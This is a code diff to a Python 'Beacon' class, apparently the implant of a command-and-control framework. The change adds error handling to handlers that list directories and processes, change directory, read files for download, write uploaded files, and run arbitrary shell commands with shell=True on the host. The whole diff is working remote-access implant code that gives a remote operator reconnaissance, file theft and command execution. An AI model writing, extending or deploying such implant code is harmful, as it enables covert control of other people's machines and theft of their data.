@@ -74,31 +74,37 @@ class Beacon:
             if instruction == "ls":
                 if cmd == "":
                     cmd = "."
-                dic = os.listdir(cmd)
-                for entry in dic:
-                    isFile = "f"
-                    if os.path.isfile(cmd+"/"+entry):
+                try:
+                    dic = os.listdir(cmd)
+                    for entry in dic:
                         isFile = "f"
-                    elif os.path.isdir(cmd+"/"+entry):
-                        isFile = "d"
-                    mask = oct(os.stat(cmd+"/"+entry).st_mode)[-3:]
-                    path = Path(cmd+"/"+entry)
-                    owner = path.owner()
-                    group = path.group()
-                    result += isFile + mask + " " + owner + " " + group + " " + cmd+"/"+entry
-                    result += "\n"
+                        if os.path.isfile(cmd+"/"+entry):
+                            isFile = "f"
+                        elif os.path.isdir(cmd+"/"+entry):
+                            isFile = "d"
+                        mask = oct(os.stat(cmd+"/"+entry).st_mode)[-3:]
+                        path = Path(cmd+"/"+entry)
+                        owner = path.owner()
+                        group = path.group()
+                        result += isFile + mask + " " + owner + " " + group + " " + cmd+"/"+entry
+                        result += "\n"
+                except:
+                    result = "No such file or directory: " + cmd
 
             elif instruction == "ps":
-                # print( list(psutil.Process().as_dict().keys()))
-                for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
-                    cmdLine = ""
-                    for cmd in proc.info["cmdline"]:
-                        cmdLine += cmd + " "
-                    if cmdLine.strip() == "":  
-                        cmdLine = proc.info["name"]
+                try:
+                    # print( list(psutil.Process().as_dict().keys()))
+                    for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
+                        cmdLine = ""
+                        for cmd in proc.info["cmdline"]:
+                            cmdLine += cmd + " "
+                        if cmdLine.strip() == "":  
+                            cmdLine = proc.info["name"]
 
-                    result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
-                    result += "\n"
+                        result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
+                        result += "\n"
+                except:
+                    result = "ps failed"
 
             elif instruction == "cd":
                 os.chdir(cmd)
@@ -119,15 +125,18 @@ class Beacon:
                     f = open(inputFile, "r")
                     data = f.read()
                     f.close()
-                    result = "OK."
+                    result = "File downloaded"
                 else:
-                    result = "File don't exists."
+                    result = "Download failed"
 
             elif instruction == "upload": 
-                f = open(outputFile, "w")
-                f.write(data)
-                f.close()
-                result = "OK."
+                try:
+                    f = open(outputFile, "w")
+                    f.write(data)
+                    f.close()
+                    result = "File uploaded."
+                except:
+                    result = "Upload failed."
 
             elif instruction == "run":
                 result = subprocess.run([cmd], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
